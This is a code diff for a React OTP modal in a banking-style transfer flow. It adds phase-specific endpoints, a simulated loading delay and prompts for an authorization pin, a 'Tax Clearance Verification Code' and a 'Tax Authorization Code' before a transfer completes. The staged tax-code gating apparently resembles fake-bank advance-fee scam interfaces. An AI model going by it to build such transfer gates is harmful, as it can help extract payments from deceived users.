@@ -1,6 +1,6 @@
 "use client"
 
-import React, { useState } from "react"
+import React, { useState, useEffect } from "react"
 import {
   AlertDialog,
   AlertDialogAction,
@@ -39,6 +39,13 @@ const OtpModal = ({ closeModal }: { closeModal: () => void }) => {
     closeModal()
   }
 
+    useEffect(() => {
+    setIsLoading(true); // Show the loading overlay
+    setTimeout(() => {
+      setIsLoading(false); // Hide the loading overlay after 2 seconds
+    }, 2000); // Simulate a 2-second loading period for testing
+  }, []);
+
   // Move to the next phase or finish the transaction
   const handleNextPhase = () => {
     if (transactionPhase < 4) {
@@ -68,19 +75,30 @@ const OtpModal = ({ closeModal }: { closeModal: () => void }) => {
 
     try {
       // Dynamic endpoint based on the phase
-      const endpointMap: { [key: number]: string } = {
-        1: "https://swiss-ultra-api-2.onrender.com/auth/verify_auth_code",
-        2: "https://swiss-ultra-api-2.onrender.com/auth/save_tin'",
-        3: "https://swiss-ultra-api-2.onrender.com/auth/complete_transfer",
-      }
+       const endpointMap: { [key: number]: { url: string; key: string } } = {
+    1: {
+      url: "https://swiss-ultra-api-2.onrender.com/auth/verify_auth_code",
+      key: "auth_code",
+    },
+    2: {
+      url: "https://swiss-ultra-api-2.onrender.com/auth/save_tin",
+      key: "tax_verification_code",
+    },
+    3: {
+      url: "https://swiss-ultra-api-2.onrender.com/auth/complete_transfer",
+      key: "second_auth_code",
+    },
+  }
 
-      const response = await fetch(endpointMap[transactionPhase], {
+      const currentEndpoint = endpointMap[transactionPhase]
+      
+      const response = await fetch(currentEndpoint.url, {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
           Authorization: `Bearer ${accessToken}`,
         },
-        body: JSON.stringify({ auth_code: passkey }),
+        body: JSON.stringify({ [currentEndpoint.key]: parseInt(passkey, 10) }),
       })
 
       const data = await response.json()
@@ -103,12 +121,12 @@ const OtpModal = ({ closeModal }: { closeModal: () => void }) => {
     }
   }
 
-  const loaderIcon = <Ellipsis className="animate-bounce" />
+  const loaderIcon = <Ellipsis className="animate-bounce w-20 h-20" />
 
   const otpSlotCount: Record<number, number> = {
-    1: 3, // Three slots for phase 1
-    2: 6, // Four slots for phase 2
-    3: 5, // Five slots for phase 3
+    1: 3,
+    2: 6, 
+    3: 4, 
   }
 
   // Using the correct count for the current transaction phase
@@ -143,8 +161,11 @@ const OtpModal = ({ closeModal }: { closeModal: () => void }) => {
                 />
               </AlertDialogTitle>
               <AlertDialogDescription>
-                Enter the OTP that was sent to your
-                registered email.
+                {transactionPhase === 1
+                  ? "Enter the 3-digit authorization pin sent to your registered email."
+                  : transactionPhase === 2
+                  ? "Enter the Tax Clearance Verification Code"
+                  : "Enter the Tax Authorization Code sent to your registered email."}
               </AlertDialogDescription>
             </AlertDialogHeader>
             <div className="shad-otp-container h-full">
